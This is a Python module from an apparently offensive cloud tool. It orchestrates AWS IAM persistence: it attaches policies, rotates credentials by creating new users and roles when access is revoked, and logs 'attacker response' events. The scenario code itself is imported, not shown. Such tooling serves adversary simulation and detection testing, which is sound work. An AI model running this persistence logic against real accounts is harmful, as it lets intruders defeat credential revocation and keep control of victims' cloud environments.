"""
Persistence Orchestrator for coordinating persistence scenarios and monitoring.

This module implements the main orchestration logic for the CLI mode of the tool.
It coordinates persistence scenarios based on credential type, manages the monitoring
engine, handles credential rotation, and ensures graceful shutdown.
"""

import asyncio
import logging
import signal
from datetime import datetime, UTC
from pathlib import Path
from typing import Optional

from .models import Credentials, CallerIdentity, ResourceTracker
from .access_key_persistence import AccessKeyPersistence
from .role_persistence import RolePersistence
from .policy_manager import PolicyManager
from .monitoring_engine import MonitoringEngine
from .profile_writer import ProfileWriter
from .event_logger import EventLogger
from .aws_clients import IAMClient, S3Client


logger = logging.getLogger(__name__)


class PersistenceOrchestrator:
    """
    Orchestrates persistence scenarios and monitoring for CLI mode.
    
    This class coordinates the entire persistence operation:
    - Initializes persistence scenarios based on credential type
    - Starts and manages the monitoring engine
    - Handles credential rotation when access is revoked
    - Updates the output profile with new credentials
    - Handles graceful shutdown on SIGINT
    - Displays summary on exit
    
    Attributes:
        credentials: Current AWS credentials
        identity: Current caller identity
        output_profile: Name of the profile to write rotated credentials to
        exit_on_access_denied: Whether to exit when access is denied
        event_logger: Logger for events and console output
        profile_writer: Writer for AWS profile updates
        resource_tracker: Tracker for created resources
        monitoring_engine: Engine for health checks and policy monitoring
        running: Flag indicating if orchestrator is running
        shutdown_requested: Flag indicating if shutdown has been requested
    """
    
    def __init__(
        self,
        credentials: Credentials,
        identity: CallerIdentity,
        output_profile: str,
        exit_on_access_denied: bool = False,
        log_file_path: Optional[Path] = None,
        json_output: bool = False
    ):
        """
        Initialize the PersistenceOrchestrator.
        
        Args:
            credentials: Initial AWS credentials
            identity: Initial caller identity
            output_profile: Name of the profile to write rotated credentials to
            exit_on_access_denied: Whether to exit when access is denied
            log_file_path: Optional path to log file (defaults to ~/.notyet/logs/session.log)
            json_output: Whether to output events as JSON instead of text
        """
        self.credentials = credentials
        self.identity = identity
        self.output_profile = output_profile
        self.exit_on_access_denied = exit_on_access_denied
        self.logger = logger  # Add logger attribute
        
        # Set up logging
        if log_file_path is None:
            log_dir = Path.home() / ".notyet" / "logs"
            log_dir.mkdir(parents=True, exist_ok=True)
            log_file_path = log_dir / f"session-{datetime.now(UTC).strftime('%Y%m%d-%H%M%S')}.log"
        
        self.event_logger = EventLogger(log_file_path, enable_console=True, json_output=json_output)
        self.profile_writer = ProfileWriter()
        
        # Initialize resource tracker
        tracker_path = Path.home() / ".notyet" / "resources.json"
        self.resource_tracker = ResourceTracker()
        self.tracker_path = tracker_path
        
        # Initialize AWS clients
        self.iam_client = IAMClient(credentials)
        self.s3_client = S3Client(credentials)
        
        # Initialize persistence scenarios
        self.access_key_persistence = AccessKeyPersistence(self.iam_client)
        self.role_persistence = RolePersistence(self.iam_client)
        self.policy_manager = PolicyManager(self.iam_client)
        
        # Initialize monitoring engine
        self.monitoring_engine = MonitoringEngine(
            policy_manager=self.policy_manager,
            s3_client=self.s3_client,
            event_logger=self.event_logger,
            on_credentials_invalid=self.rotate_credentials
        )
        
        # State flags
        self.running = False
        self.shutdown_requested = False
        
        # Statistics for summary
        self.start_time = datetime.now(UTC)
        self.rotations_count = 0
        self.actions_taken = []
    
    async def start(self) -> None:
        """
        Start the persistence orchestrator.
        
        This method:
        1. Sets up signal handlers for graceful shutdown
        2. Establishes initial persistence (policy management)
        3. Writes initial credentials to output profile
        4. Starts the monitoring engine
        5. Waits for shutdown signal
        
        **Validates: Requirements 3.8, 3.9, 4.5, 4.6, 10.5, 16.1, 16.2, 16.3, 16.4, 16.5**
        """
        if self.running:
            raise RuntimeError("Orchestrator is already running")
        
        self.running = True
        self.event_logger.log_event(
            "INFO",
            "Persistence orchestrator starting",
            {"output_profile": self.output_profile}
        )
        
        # Set up signal handlers for graceful shutdown
        self._setup_signal_handlers()
        
        try:
            # Step 1: Establish initial persistence (policy management)
            self.event_logger.log_event(
                "INFO",
                "Establishing initial persistence",
                {"identity": self.identity.arn}
            )
            
            policy_name = self.policy_manager.establish_policy(self.identity)
            self.actions_taken.append(f"Attached policy: {policy_name}")
            self.resource_tracker.add_policy(policy_name, self.identity.identity_name)
            
            # Step 2: Write initial credentials to output profile
            self.event_logger.log_event(
                "INFO",
                f"Writing initial credentials to profile: {self.output_profile}",
                {}
            )
            self.profile_writer.write_credentials(self.output_profile, self.credentials)
            
            # Step 3: Save resource tracker state
            self.resource_tracker.save(self.tracker_path)
            
            # Step 4: Start monitoring engine
            self.event_logger.log_event(
                "INFO",
                "Starting monitoring engine",
                {}
            )
            
            # Run monitoring engine (this will block until stopped)
            await self.monitoring_engine.start(
                identity=self.identity,
                exit_on_access_denied=self.exit_on_access_denied
            )
            
        except KeyboardInterrupt:
            self.event_logger.log_event(
                "INFO",
                "Keyboard interrupt received",
                {}
            )
        except Exception as e:
            self.event_logger.log_event(
                "ERROR",
                f"Error in orchestrator: {str(e)}",
                {"error": str(e)}
            )
            logger.error(f"Error in orchestrator: {str(e)}", exc_info=True)
        finally:
            await self._shutdown()
    
    async def rotate_credentials(self) -> None:
        """
        Rotate credentials based on credential type.
        
        This method determines the appropriate persistence scenario based on
        whether the current credentials are persistent (AKIA*) or temporary (ASIA*),
        executes the scenario, updates the credentials, and writes them to the
        output profile.
        
        **Validates: Requirements 3.8, 3.9, 4.5, 4.6**
        """
        self.event_logger.log_attacker_response(
            "Initiating credential rotation",
            {"current_type": "persistent" if self.credentials.is_persistent else "temporary"}
        )
        
        try:
            start_time = datetime.now(UTC)
            
            # Determine which scenario to use based on credential type
            if self.credentials.is_persistent:
                # Use access key persistence scenario
                self.event_logger.log_event(
                    "INFO",
                    "Using access key persistence scenario",
                    {}
                )
                new_credentials = self.access_key_persistence.execute(
                    current_credentials=self.credentials,
                    account_id=self.identity.account,
                    original_user_name=self.identity.identity_name
                )
                
                # Write temporary role credentials to separate profile for debugging
                if hasattr(self.access_key_persistence, 'temp_credentials'):
                    temp_profile_name = f"{self.output_profile}-role"
                    self.profile_writer.write_credentials(
                        temp_profile_name,
                        self.access_key_persistence.temp_credentials
                    )
                    logger.debug(f"Wrote temporary role credentials to profile: {temp_profile_name}")
                
                # Track created users
                for user in self.access_key_persistence.created_users:
                    self.resource_tracker.add_user(user)
                
                # Store temp role info for cleanup after we get new credentials
                temp_role_cleanup = None
                if hasattr(self.access_key_persistence, 'temp_role_name'):
                    temp_role_cleanup = {
                        'role_name': self.access_key_persistence.temp_role_name,
                        'policy_name': self.access_key_persistence.temp_policy_name
                    }
                
            else:
                # Use role persistence scenario
                self.event_logger.log_event(
                    "INFO",
                    "Using role persistence scenario",
                    {}
                )
                new_credentials = self.role_persistence.execute(
                    current_credentials=self.credentials,
                    account_id=self.identity.account
                )
                
                # Track created roles
                for role in self.role_persistence.created_roles:
                    self.resource_tracker.add_role(role)
                
                temp_role_cleanup = None
            
            # Calculate elapsed time
            elapsed = (datetime.now(UTC) - start_time).total_seconds() * 1000
            
            # Update credentials and clients
            self.credentials = new_credentials
            self.iam_client = IAMClient(new_credentials)
            self.s3_client = S3Client(new_credentials)
            
            # Get new identity
            from .aws_clients import STSClient
            sts_client = STSClient(new_credentials)
            self.identity = sts_client.get_caller_identity()
            
            # Update monitoring engine clients and identity
            self.monitoring_engine.s3 = self.s3_client
            self.monitoring_engine.identity = self.identity
            self.policy_manager.iam = self.iam_client
            
            # Re-establish policy for new identity
            policy_name = self.policy_manager.establish_policy(self.identity)
            self.resource_tracker.add_policy(policy_name, self.identity.identity_name)
            
            # Clean up temporary role if needed (using new credentials)
            if temp_role_cleanup:
                try:
                    self.logger.info(
                        f"Cleaning up temporary role {temp_role_cleanup['role_name']} "
                        f"using new credentials"
                    )
                    self.iam_client.delete_role_policy(
                        role_name=temp_role_cleanup['role_name'],
                        policy_name=temp_role_cleanup['policy_name']
                    )
                    self.iam_client.delete_role(role_name=temp_role_cleanup['role_name'])
                    self.logger.info(f"Temporary role {temp_role_cleanup['role_name']} deleted successfully")
                except Exception as cleanup_error:
                    self.logger.warning(
                        f"Failed to clean up temporary role {temp_role_cleanup['role_name']}: "
                        f"{str(cleanup_error)}. Manual cleanup may be required."
                    )
            
            # Write new credentials to output profile
            self.profile_writer.write_credentials(self.output_profile, new_credentials)
            
            # Save resource tracker state
            self.resource_tracker.save(self.tracker_path)
            
            # Update statistics
            self.rotations_count += 1
            self.actions_taken.append(
                f"Rotated credentials (elapsed: {elapsed:.0f}ms)"
            )
            
            self.event_logger.log_attacker_response(
                f"Credential rotation completed (elapsed: {elapsed:.0f}ms)",
                {
                    "new_access_key": new_credentials.access_key_id,
                    "elapsed_ms": elapsed
                }
            )
            
        except Exception as e:
            self.event_logger.log_event(
                "ERROR",
                f"Failed to rotate credentials: {str(e)}",
                {"error": str(e)}
            )
            logger.error(f"Failed to rotate credentials: {str(e)}", exc_info=True)
            raise
    
    def _setup_signal_handlers(self) -> None:
        """
        Set up signal handlers for graceful shutdown.
        
        Handles SIGINT (Ctrl+C) to trigger graceful shutdown.
        
        **Validates: Requirements 16.1**
        """
        def signal_handler(signum, frame):
            """Handle shutdown signals."""
            if not self.shutdown_requested:
                self.shutdown_requested = True
                self.event_logger.log_event(
                    "INFO",
                    "Shutdown signal received (SIGINT)",
                    {}
                )
                # Stop monitoring engine
                asyncio.create_task(self.monitoring_engine.stop())
        
        signal.signal(signal.SIGINT, signal_handler)
    
    async def _shutdown(self) -> None:
        """
        Perform graceful shutdown.
        
        This method:
        1. Stops the monitoring engine
        2. Completes any in-progress operations
        3. Saves resource tracker state
        4. Displays summary of actions taken
        
        **Validates: Requirements 16.1, 16.2, 16.3, 16.4, 16.5**
        """
        if not self.running:
            return
        
        self.event_logger.log_event(
            "INFO",
            "Shutting down orchestrator",
            {}
        )
        
        # Stop monitoring engine if still running
        if self.monitoring_engine.running:
            await self.monitoring_engine.stop()
        
        # Save final resource tracker state
        try:
            self.resource_tracker.save(self.tracker_path)
        except Exception as e:
            logger.error(f"Failed to save resource tracker: {str(e)}")
        
        # Display summary
        self._display_summary()
        
        self.running = False
    
    def _display_summary(self) -> None:
        """
        Display summary of actions taken during the session.
        
        **Validates: Requirements 16.3**
        """
        elapsed_time = (datetime.now(UTC) - self.start_time).total_seconds()
        
        self.event_logger.log_event(
            "INFO",
            "=== Session Summary ===",
            {}
        )
        
        self.event_logger.log_event(
            "INFO",
            f"Session duration: {elapsed_time:.1f} seconds",
            {"duration_seconds": elapsed_time}
        )
        
        self.event_logger.log_event(
            "INFO",
            f"Credential rotations: {self.rotations_count}",
            {"rotations": self.rotations_count}
        )
        
        self.event_logger.log_event(
            "INFO",
            f"Resources created:",
            {
                "users": len(self.resource_tracker.users),
                "roles": len(self.resource_tracker.roles),
                "policies": len(self.resource_tracker.policies)
            }
        )
        
        if self.resource_tracker.users:
            self.event_logger.log_event(
                "INFO",
                f"  Users: {', '.join(self.resource_tracker.users)}",
                {}
            )
        
        if self.resource_tracker.roles:
            self.event_logger.log_event(
                "INFO",
                f"  Roles: {', '.join(self.resource_tracker.roles)}",
                {}
            )
        
        if self.resource_tracker.policies:
            self.event_logger.log_event(
                "INFO",
                f"  Policies: {', '.join(self.resource_tracker.policies.keys())}",
                {}
            )
        
        self.event_logger.log_event(
            "INFO",
            f"Output profile: {self.output_profile}",
            {}
        )
        
        self.event_logger.log_event(
            "INFO",
            "=== End Summary ===",
            {}
        )
